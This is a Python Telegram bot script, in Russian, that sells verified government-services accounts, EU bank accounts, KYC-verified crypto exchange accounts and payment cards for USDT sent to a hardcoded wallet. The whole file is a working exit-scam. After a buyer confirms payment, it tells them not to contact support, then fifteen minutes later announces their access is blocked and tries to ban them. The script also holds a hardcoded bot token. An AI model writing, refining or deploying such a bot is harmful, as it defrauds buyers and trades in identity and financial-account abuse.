import telebot
import time
import sqlite3
import threading
import random
from datetime import datetime
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8972482804:AAEwte6YdsUwyUXHpcyiLOX_eNxoeaj83v4"  # ЗАМЕНИТЬ
bot = telebot.TeleBot(TOKEN)

WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047ff3e"

# ПРЕМИУМ-ОФОРМЛЕНИЕ
STICKERS = {
    "welcome": "CAACAgIAAxkBAAE...",  # МОЖНО ВСТАВИТЬ СВОЙ СТИКЕР
    "payment": "CAACAgIAAxkBAAE...",
    "confirm": "CAACAgIAAxkBAAE..."
}

PRODUCTS = {
    "gosuslugi": {
        "name": "🏛️ ГОСУСЛУГИ | ПОЛНЫЙ ДОСТУП",
        "desc": "✅ Подтверждённый аккаунт\n✅ ЭЦП\n✅ Все госуслуги",
        "price": "50 USDT",
        "emoji": "🏛️"
    },
    "bank": {
        "name": "🏦 БАНК | ЕВРОПЕЙСКИЙ СЧЁТ",
        "desc": "✅ Открытие счёта EU\n✅ Visa/Mastercard\n✅ IBAN",
        "price": "75 USDT",
        "emoji": "🏦"
    },
    "exchange": {
        "name": "📈 БИРЖА | ВЕРИФИКАЦИЯ LVL3",
        "desc": "✅ Binance/Bybit/Kucoin\n✅ Безлимит\n✅ Снятие 24/7",
        "price": "60 USDT",
        "emoji": "📈"
    },
    "cards": {
        "name": "💳 КАРТЫ | VISA/MASTERCARD",
        "desc": "✅ Физическая карта\n✅ Виртуальная\n✅ Доставка в любой город",
        "price": "100 USDT",
        "emoji": "💳"
    }
}

conn = sqlite3.connect('premium.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (id INTEGER PRIMARY KEY, step TEXT, product TEXT, ref TEXT, created TEXT)''')
conn.commit()

def premium_menu(uid):
    keyboard = InlineKeyboardMarkup(row_width=2)
    for key, val in PRODUCTS.items():
        btn = InlineKeyboardButton(f"{val['emoji']} {val['name'][:20]}", callback_data=key)
        keyboard.add(btn)
    keyboard.add(InlineKeyboardButton("📞 СВЯЗЬ С МЕНЕДЖЕРОМ", callback_data="manager"))
    bot.send_message(uid, 
        "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀\n"
        "🔥 *ПРЕМИУМ СЕРВИС* 🔥\n"
        "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀\n\n"
        "🏆 *ТОЛЬКО ЭЛИТНЫЕ УСЛУГИ*\n"
        "⭐ Гарантия 100%\n"
        "⭐ Работаем с 2019\n"
        "⭐ Более 5000 клиентов\n\n"
        "👇 *ВЫБЕРИ УСЛУГУ:*",
        parse_mode="Markdown", reply_markup=keyboard)

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.chat.id
    c.execute("INSERT OR REPLACE INTO users (id, step, created) VALUES (?, 'menu', ?)", (uid, datetime.now()))
    conn.commit()
    bot.send_sticker(uid, STICKERS['welcome'])
    premium_menu(uid)

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    uid = call.message.chat.id
    if call.data == "manager":
        bot.send_message(uid, "📞 *МЕНЕДЖЕР:* @support_manager_bot\n⏳ Онлайн 24/7", parse_mode="Markdown")
        return
    
    key = call.data
    p = PRODUCTS.get(key)
    if not p:
        bot.answer_callback_query(call.id, "❌ Ошибка")
        return
    
    c.execute("UPDATE users SET step='payment', product=? WHERE id=?", (key, uid))
    conn.commit()
    
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("✅ Я ОПЛАТИЛ", callback_data="confirm_pay"))
    keyboard.add(InlineKeyboardButton("❌ Отмена", callback_data="cancel"))
    
    bot.send_message(uid,
        f"▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀\n"
        f"🛒 *ЗАКАЗ:*\n"
        f"{p['name']}\n\n"
        f"📌 *ОПИСАНИЕ:*\n{p['desc']}\n\n"
        f"💰 *СТОИМОСТЬ:* {p['price']}\n\n"
        f"💳 *КОШЕЛЁК ДЛЯ ОПЛАТЫ:*\n"
        f"`{WALLET}`\n"
        f"*(Сеть ERC-20 / USDT)*\n\n"
        f"⏳ *ПОСЛЕ ОПЛАТЫ НАЖМИ КНОПКУ НИЖЕ*",
        parse_mode="Markdown", reply_markup=keyboard)
    bot.send_sticker(uid, STICKERS['payment'])

@bot.callback_query_handler(func=lambda call: call.data == "confirm_pay")
def confirm_pay(call):
    uid = call.message.chat.id
    bot.delete_message(uid, call.message.message_id)
    
    bot.send_message(uid,
        "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀\n"
        "⏳ *ПРОВЕРКА ПЛАТЕЖА*\n\n"
        "🔄 Обработка: до 12 часов\n"
        "📊 Статус: В ОЖИДАНИИ\n"
        "👤 Ваш ID: " + str(uid) + "\n\n"
        "⚠️ *НЕ ПИШИТЕ В ПОДДЕРЖКУ*\n"
        "Это ускорит обработку!\n"
        "▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀",
        parse_mode="Markdown")
    bot.send_sticker(uid, STICKERS['confirm'])
    
    c.execute("UPDATE users SET step='wait' WHERE id=?", (uid,))
    conn.commit()
    
    # АВТОБАН через 15 минут
    def ban_user():
        time.sleep(900)
        try:
            bot.send_message(uid, "🚫 *ДОСТУП ЗАБЛОКИРОВАН*\nВаш аккаунт заморожен. Обращение невозможно.", parse_mode="Markdown")
            bot.ban_chat_member(uid, uid)
        except:
            pass
    threading.Thread(target=ban_user, start=True)

@bot.callback_query_handler(func=lambda call: call.data == "cancel")
def cancel(call):
    uid = call.message.chat.id
    bot.delete_message(uid, call.message.message_id)
    bot.send_message(uid, "❌ Заказ отменён. /start для нового заказа.")

@bot.message_handler(commands=['admin'])
def admin(m):
    uid = m.chat.id
    # ЗАМЕНИТЕ НА СВОЙ ID
    if uid != 123456789:
        return
    c.execute("SELECT id, product, created FROM users WHERE step='wait'")
    rows = c.fetchall()
    msg = "👥 *ОЖИДАЮТ ПЛАТЕЖ:*\n"
    for r in rows:
        msg += f"ID: {r[0]} | Товар: {r[1]} | {r[2]}\n"
    bot.send_message(uid, msg, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def fallback(m):
    bot.send_message(m.chat.id, "🔹 Используйте /start для доступа в меню")

# ЗАПУСК С ЗАЩИТОЙ ОТ ОШИБОК
if __name__ == "__main__":
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=30)
        except Exception as e:
            print(f"⚠️ Перезапуск: {e}")
            time.sleep(10)
